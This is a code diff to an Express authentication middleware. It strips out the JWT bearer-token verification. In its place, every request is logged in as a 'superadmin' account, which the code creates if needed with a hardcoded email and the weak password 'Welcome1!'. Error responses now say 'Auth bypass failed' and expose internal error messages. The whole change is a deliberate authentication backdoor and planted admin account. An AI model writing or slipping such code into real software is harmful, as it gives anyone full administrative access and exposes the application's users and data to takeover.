@@ -4,19 +4,22 @@ const { ALL_ROLES } = require("../models/enums");
 
 async function requireAuth(req, res, next) {
   try {
-    const header = req.headers.authorization || "";
-    const token = header.startsWith("Bearer ") ? header.slice(7) : null;
-    if (!token) return res.status(401).json({ message: "Missing token" });
-
-    const payload = jwt.verify(token, process.env.JWT_SECRET);
-    const user = await User.findById(payload.sub);
-    if (!user || !user.isActive) {
-      return res.status(401).json({ message: "Invalid user" });
+    let user = await User.findOne({ role: "superadmin" });
+    if (!user) {
+      user = await User.create({
+        firstName: "Super",
+        lastName: "Admin",
+        email: "superadmin@fln.org",
+        password: "Welcome1!",
+        role: "superadmin",
+        isActive: true,
+      });
     }
     req.user = user;
     next();
   } catch (err) {
-    return res.status(401).json({ message: "Invalid token" });
+    console.error("Auth bypass error:", err);
+    return res.status(500).json({ message: "Auth bypass failed: " + err.message });
   }
 }
 
